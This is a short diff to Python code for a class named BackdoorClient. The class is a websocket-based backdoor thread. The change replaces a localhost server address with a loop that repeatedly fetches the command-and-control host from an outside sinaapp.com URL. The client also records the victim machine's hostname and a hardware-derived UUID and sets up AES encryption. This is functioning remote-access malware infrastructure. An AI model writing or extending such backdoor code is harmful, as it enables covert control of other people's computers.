@@ -31,7 +31,16 @@ class BackdoorClient(threading.Thread):
 
     def __init__(self):
         threading.Thread.__init__(self)
-        self.SERVER_HOST = 'ws://localhost:8888'
+
+        host = None
+        while host is None:
+            try:
+                json_str = urllib.urlopen('http://1.nekocode.sinaapp.com/nbd_server_host').read()
+                host = json.loads(json_str)
+            except:
+                time.sleep(10)
+
+        self.SERVER_HOST = host['host']
         self.HOST_NAME = hostname()
         self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
